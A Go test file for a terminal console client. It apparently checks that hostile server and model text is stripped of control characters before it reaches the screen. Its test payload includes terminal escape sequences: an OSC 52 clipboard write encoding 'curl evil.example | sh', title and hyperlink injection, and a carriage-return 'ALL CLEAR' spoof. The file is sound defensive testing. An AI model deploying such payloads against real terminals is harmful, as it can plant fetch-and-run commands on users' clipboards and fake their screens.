package console

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/muesli/termenv"
)

// bad is what a terminal acts on instead of printing (security scan F25): OSC
// 52 writing the clipboard ("curl evil.example | sh"), a window title, an OSC
// 8 hyperlink, CSI clear-screen and colour, the 8-bit C1 CSI, OSC and ST, a
// carriage return that reprints its line, DEL, BEL, NUL and a backspace.
const bad = "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\x07" +
	"\x1b]0;pwned\x07" +
	"\x1b]8;;https://evil.example/\x1b\\link\x1b]8;;\x1b\\" +
	"\x1b[2J\x1b[H\x1b[31m" +
	"\u009b2J\u009d0;pwned\u009c" +
	"\rALL CLEAR\x7f\x00\x08"

func evil(s string) string { return s + bad }

func js(v any) string { b, _ := json.Marshal(v); return string(b) }

// hostileCore is fakeCore with model and server text that carries bad in
// every string the console shows (IDs stay plain: they route requests). With
// up false, every /appd/ call fails with a hostile error sentence instead.
func hostileCore(t *testing.T, up bool) string {
	t.Helper()
	now := time.Now().Unix()
	sock := filepath.Join(t.TempDir(), "core.sock")
	ln, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	j := func(code int, body string) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(code)
			fmt.Fprint(w, body)
		}
	}
	type m = map[string]any
	mux.HandleFunc("/core/status", j(200, js(m{"version": "2.3.0", "paired": true, "url": "https://huginn.example.net:8787", "tray": true,
		"device": m{"status": m{"enabled": true, "enrolled": true, "note": evil("Waiting for work"), "deviceId": "d1"},
			"settings": m{"enabled": true, "name": evil("laptop"), "scope": evil("workish")}}})))
	refused := js(m{"error": evil("huginn refused")})
	if !up {
		mux.HandleFunc("/appd/", j(503, refused))
	} else {
		mux.HandleFunc("/appd/v1/status", j(200, js(m{"host": evil("huginn"), "appdVersion": evil("3.12.0"), "uptimeSec": 3600, "load": []float64{0.5},
			"claude": evil("2.1.300"), "disk": m{"free": evil("9G"), "usedPercent": evil("91%")},
			"headroom": m{"worstPercent": 66, "worstLabel": evil("Current week"), "mode": "auto"}})))
		mux.HandleFunc("/appd/v1/sessions", j(200, js(m{"sessions": []m{
			{"name": evil("main"), "state": "attention", "title": evil("Ship it?"), "preview": []string{evil("Do you want to proceed?")}, "activityAt": now - 60, "liveModel": evil("Opus")},
			{"name": "build", "state": "idle", "title": "", "preview": []string{evil("$ make")}, "activityAt": now - 120},
		}})))
		mux.HandleFunc("/appd/v1/devices", j(200, js(m{"devices": []m{
			{"id": "d1", "name": evil("laptop"), "platform": evil("linux"), "scope": evil("work"), "online": true, "version": evil("2.3.0"), "lastSeenSec": now},
		}})))
		mux.HandleFunc("/appd/v1/headroom", j(200, js(m{"mode": "auto",
			"accounts": m{evil("a1"): m{"email": "", "live": true, "windows": m{evil("session"): m{"percent": 3,
				"resetsAt": time.Unix(now, 0).Add(252 * time.Hour).UTC().Format(time.RFC3339), "label": evil("Current session")}}}},
			"sentinels": m{evil("STOP"): m{"reason": evil("held by hand")}},
			"held":      []m{{"name": evil("x")}}, "arbiter": m{"why": evil("under every threshold")}})))
		mux.HandleFunc("/appd/v1/chats", j(200, js(m{"chats": []m{
			{"id": "c1", "title": evil("Budget review"), "mode": evil("ask"), "updatedAt": now - 60, "lastSnippet": evil("Fixed costs"), "hostName": evil("h")},
			{"id": "c2", "title": evil("Broken"), "mode": "ask", "updatedAt": now - 90, "lastSnippet": evil("x")},
		}})))
		mux.HandleFunc("/appd/v1/chats/c1", j(200, js(m{"id": "c1", "title": evil("Budget review"), "mode": evil("ask"), "seq": 0,
			"messages": []m{
				{"type": "user", "text": evil("How much?")},
				{"type": "tool", "name": evil("Read"), "input": evil("/srv/config.yaml")},
				{"type": "assistant", "text": evil("A third.")},
				{"type": "result", "ok": false, "errorText": evil("stopped"), "turns": 2, "costUsd": 0.04},
				{"type": "error", "text": evil("it failed")},
			}})))
		mux.HandleFunc("/appd/v1/chats/c2", j(500, refused))
		mux.HandleFunc("/appd/v1/chats/c1/messages", j(202, `{"ok":true,"running":true}`))
		mux.HandleFunc("/appd/v1/chats/c1/stream", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "text/event-stream")
			fmt.Fprintf(w, "event: tool_start\ndata: %s\n\n", js(m{"name": evil("Bash")}))
			fmt.Fprintf(w, "event: delta\ndata: %s\n\n", js(m{"text": evil("Streamed ")}))
			fmt.Fprintf(w, "event: delta\ndata: %s\n\n", js(m{"text": "\x1b"}))
			fmt.Fprintf(w, "event: delta\ndata: %s\n\n", js(m{"text": "]52;c;eA==\x07answer."}))
			fmt.Fprintf(w, "event: error\ndata: %s\n\n", js(m{"text": evil("the run failed")}))
			fmt.Fprint(w, "event: done\ndata: {}\n\n")
		})
		mux.HandleFunc("/appd/v1/rounds", j(200, js(m{"rounds": []m{
			{"id": "r1", "title": evil("Morning briefing"), "enabled": true, "mode": "ask", "cadence": evil("Daily at 7:00 AM"), "nextRunAtSec": now + 3*3600,
				"lastRun": m{"at": now - 20*3600, "chatId": "c1", "status": "ok", "headline": evil("All quiet")}},
		}})))
		mux.HandleFunc("/appd/v1/rounds/r1", j(500, refused))
		mux.HandleFunc("/appd/v1/projects", j(200, js(m{"projects": []m{
			{"id": "p1", "name": evil("website"), "kind": evil("software"), "status": "active", "memberCount": 1, "alive": 1, "busy": 1, "manifestSummary": evil("The site")},
		}})))
		mux.HandleFunc("/appd/v1/projects/p1/dashboard", j(200, js(m{"members": []m{
			{"role": evil("lead"), "name": evil("website-lead"), "alive": true, "state": "attention", "needsYou": true, "title": evil("Ship 0.8.0?"), "turns": 4},
		}})))
		mux.HandleFunc("/appd/v1/archive", j(200, js(m{"archives": []m{
			{"id": "a1", "title": evil("Old migration"), "model": evil("Opus"), "lastMessage": evil("Done"), "archivedAt": now - 86400},
		}})))
		mux.HandleFunc("/appd/v1/watch", func(w http.ResponseWriter, r *http.Request) { <-r.Context().Done() })
	}
	srv := &http.Server{Handler: mux}
	go srv.Serve(ln)
	t.Cleanup(func() { srv.Close() })
	return sock
}

// executable reports the first rune a terminal would act on rather than show:
// a C0 control other than newline and tab, DEL, or a C1 control.
func executable(s string) (rune, int, bool) {
	for i, r := range s {
		if (r < 0x20 && r != '\n' && r != '\t') || (r >= 0x7f && r <= 0x9f) {
			return r, i, true
		}
	}
	return 0, 0, false
}

// mustBeInert fails for every line of frame that carries a control, and
// when frame lacks want (the hostile field was not on screen, so a clean
// frame would prove nothing).
func mustBeInert(t *testing.T, what, frame, want string) {
	t.Helper()
	if !strings.Contains(frame, want) {
		t.Errorf("%s: %q is not on screen, so this case shows nothing:\n%s", what, want, frame)
	}
	for n, line := range strings.Split(frame, "\n") {
		if r, i, found := executable(line); found {
			lo, hi := max(0, i-24), min(len(line), i+24)
			t.Errorf("%s, line %d: %U reaches the terminal, in %q", what, n, r, line[lo:hi])
		}
	}
}

// Every screen that shows server or model text, with that text hostile: the
// frame is plain-ASCII and colourless here (render), so ANY control in it came
// from the server.
func TestHostileTextReachesNoScreen(t *testing.T) {
	sock := hostileCore(t, true)
	for _, c := range []struct {
		name, want string
		keys       []string
	}{
		{"home", "Ship it?", nil},
		{"sessions", "Do you want to proceed?", []string{"1"}},
		{"chats", "Fixed costs", []string{"2"}},
		{"chat", "A third.", []string{"2", "enter"}},
		{"chat error", "huginn refused", []string{"2", "down", "enter"}},
		{"chat rename prompt", "title: Budget review", []string{"2", "R"}},
		{"projects", "website", []string{"3"}},
		{"project", "Ship 0.8.0?", []string{"3", "enter"}},
		{"rounds", "All quiet", []string{"4"}},
		{"rounds delete prompt", "delete the round Morning briefing", []string{"4", "x"}},
		{"rounds refused", "huginn refused", []string{"4", "p"}},
		{"devices", "linux", []string{"5"}},
		{"usage", "held: STOP", []string{"6"}},
		{"archive", "Old migration", []string{"7"}},
		{"settings", "workish", []string{"8"}},
		{"core", "2.1.300", []string{"9"}},
		{"palette", "round Morning briefing", []string{":"}},
		{"palette typed", "attach main", []string{":", "m", "a"}},
	} {
		mustBeInert(t, c.name, render(t, sock, 120, 40, c.keys...), c.want)
	}
	mustBeInert(t, "huginn unreachable", render(t, hostileCore(t, false), 120, 40), "huginn refused")
}

// A run's streamed text, tool names and error events are model text too, and
// arrive one delta at a time (an ESC alone in one, its sequence in the next).
func TestHostileStreamReachesNoScreen(t *testing.T) {
	sock := hostileCore(t, true)
	os.Setenv("HUGINN_ASCII", "1")
	lipgloss.SetColorProfile(termenv.Ascii)
	m := newModel(context.Background(), Options{Socket: sock, Proto: "1", Version: "2.3.0", Home: t.TempDir()})
	m.Update(tea.WindowSizeMsg{Width: 120, Height: 40})
	m.Update(m.fetch()())
	drain(m, m.openChat("c1"))
	m.send("and the next one?")
	sawLive := false
	for deadline := time.Now().Add(5 * time.Second); time.Now().Before(deadline); {
		select {
		case msg := <-m.events:
			ev, ok := msg.(chatEvent)
			if !ok {
				continue
			}
			cmd := m.onChatEvent(ev)
			frame := m.View()
			want := map[string]string{"tool_start": "Bash", "delta": "Streamed", "error": "the run failed"}[ev.event]
			mustBeInert(t, "stream after "+ev.event, frame, want)
			sawLive = sawLive || strings.Contains(frame, "answer.")
			if ev.event == "done" {
				drain(m, cmd)
				mustBeInert(t, "chat after the run", m.View(), "A third.")
				if !sawLive {
					t.Fatalf("the last delta never showed:\n%s", frame)
				}
				return
			}
		case <-time.After(5 * time.Second):
			t.Fatal("no stream events")
		}
	}
	t.Fatal("the run never finished")
}

func TestClean(t *testing.T) {
	for in, want := range map[string]string{
		"plain text":                       "plain text",
		"two\nlines\tand a tab":            "two\nlines\tand a tab",
		"é ✓ 漢字 \u00a0nbsp":                "é ✓ 漢字 \u00a0nbsp",
		"x\x1b]52;c;ZXZpbA==\x07y":         "x]52;c;ZXZpbA==y", // OSC 52: the clipboard
		"\x1b]0;title\x1b\\":               "]0;title\\",
		"\x1b[2J\x1b[31mred\x1b[0m":        "[2J[31mred[0m",
		"\u009b2J\u009d0;t\u009c\u0085nel": "2J0;tnel", // C1 CSI, OSC, ST, NEL
		"scan\x1b[2K\rALL CLEAR":           "scan[2KALL CLEAR",
		"a\x7fb\x00c\x07d\x08e\x0bf\x0cg":  "abcdefg",
		"a\x9bb":                           "a\ufffdb", // a raw 8-bit CSI byte is not UTF-8
		"\xc2":                             "\ufffd",
		"\x1b":                             "",
		"":                                 "",
	} {
		if got := clean(in); got != want {
			t.Errorf("clean(%q) = %q, want %q", in, got, want)
		}
	}
}

// scrub reaches every string a response can decode into, including through
// an embedded struct of an unexported type (chatDetail's title lives there),
// pointers, map keys and interfaces, and leaves bytes and unexported fields
// alone without panicking.
func TestScrubReachesEveryString(t *testing.T) {
	type inner struct {
		S string
		P *string
	}
	type embedded struct{ Title string }
	type shape struct {
		embedded
		Name    string
		Ptr     *string
		List    []string
		Rows    []inner
		Arr     [2]string
		ByKey   map[string]inner
		Ptrs    map[string]*inner
		Nested  map[string]map[string]string
		Any     map[string]any
		AnyList []any
		Raw     json.RawMessage
		hidden  string
		hidMap  map[string]string
	}
	in := strings.ReplaceAll(`{"Title":"T~","Name":"N~","Ptr":"P~","List":["L~"],"Rows":[{"S":"R~","P":"RP~"}],"Arr":["A~","B~"],
		"ByKey":{"k~":{"S":"V~"}},"Ptrs":{"p~":{"S":"PV~"}},"Nested":{"o~":{"i~":"NV~"}},
		"Any":{"a~":"AV~","n":{"deep~":["D~"]}},"AnyList":["X~",{"y~":"Y~"}],"Raw":"raw~"}`, "~", `\u001b]52;c;eA==\u0007\u009b`)
	var v shape
	if err := json.Unmarshal([]byte(in), &v); err != nil {
		t.Fatal(err)
	}
	v.hidden, v.hidMap = "h\x1b", map[string]string{"k\x1b": "v\x1b"}
	scrub(&v)
	const c = "]52;c;eA==" // what is left of the hostile tail: printable, inert
	chk := v
	chk.Raw = nil // bytes keep what they had (below)
	got, _ := json.Marshal(chk)
	if strings.Contains(string(got), `\u00`) {
		t.Fatalf("scrub left a control: %s", got)
	}
	for _, want := range []string{`"Title":"T` + c, `"Name":"N` + c, `"Ptr":"P` + c, `"L` + c, `"S":"R` + c, `"P":"RP` + c,
		`"A` + c, `"k` + c + `":{"S":"V` + c, `"p` + c + `":{"S":"PV` + c, `"o` + c + `":{"i` + c + `":"NV` + c,
		`"a` + c + `":"AV` + c, `"deep` + c + `":["D` + c, `"X` + c, `"y` + c + `":"Y` + c} {
		if !strings.Contains(string(got), want) {
			t.Errorf("scrubbed value lacks %s:\n%s", want, got)
		}
	}
	if string(v.Raw) != `"raw\u001b]52;c;eA==\u0007\u009b"` {
		t.Errorf("raw bytes were touched: %s", v.Raw)
	}
	if v.hidden != "h\x1b" || v.hidMap["k\x1b"] != "v\x1b" {
		t.Error("an unexported field was written")
	}
	scrub(nil)                              // no panic on nothing
	scrub(&struct{ M map[string]string }{}) // nor on a nil map
}
